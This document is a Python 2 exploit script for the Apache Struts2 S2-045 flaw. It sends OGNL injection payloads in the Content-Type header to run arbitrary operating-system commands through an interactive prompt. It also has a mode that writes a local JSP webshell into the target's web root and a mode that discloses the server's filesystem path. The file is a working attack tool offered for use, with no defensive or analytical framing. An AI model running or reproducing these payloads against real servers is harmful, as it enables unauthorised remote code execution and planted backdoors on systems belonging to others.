import urllib,requests,sys,getopt
def exp(url,payload):
    try:
        headers = {'Content-Type': payload,
           'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:22.0) Gecko/20100101 Firefox/22.0'}
        print requests.post(url,data="", headers=headers,verify=False).text
    except requests.RequestException as e:
        print "Exploit Fail\n" + str(e)
print "S2-045 Exploit // Code By Luan"
opts, args = getopt.getopt(sys.argv[1:], "u:cf:p:sg",["url=","cmd","filename=","path=","shell","getpath"])
url,path,payload,jspFilename = "","","","luan.jsp"
for op, value in opts:
    if op in ('-u','--url'):
        url = value
    elif op in ('-c','--cmd'):
        while 1:
            cmd = raw_input("[cmd]>>")
            payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='" + cmd + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
            exp(url,payload)
    elif op in ('-f','--filename'):
        jspFilename = value
    elif op in ('-p','--path'):
        path = "'" + value + "'"
    elif op in ('-s','--shell'):
        print "upload webshell ..."
        jspCode = urllib.quote_plus(open(jspFilename).read( ), safe='qwertyuiopasdfghjklzxcvbnm./')
        if path == "":
            path = "#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')"
        payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=" + path + ").(#shell='" + jspCode + "').(new java.io.BufferedWriter(new java.io.FileWriter(#path+'/"+jspFilename+"').append(new java.net.URLDecoder().decode(#shell,'UTF-8'))).close()).(#cmd='echo shell:'+#path+'"+jspFilename+"').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
        exp(url,payload)
        sys.exit(0)
    elif op in ('-g','--getpath'):
        print "get website path ..."
        payload = "%{(#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#luan='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#path=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletRequest').getSession().getServletContext().getRealPath('/')).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.write(#path.getBytes())).(#ros.flush())}"
        exp(url,payload)
        sys.exit(0)
print "Useage : exp.py -u url [-c cmd] [-f filename] [-p path] [-s shell] [-g getpath]"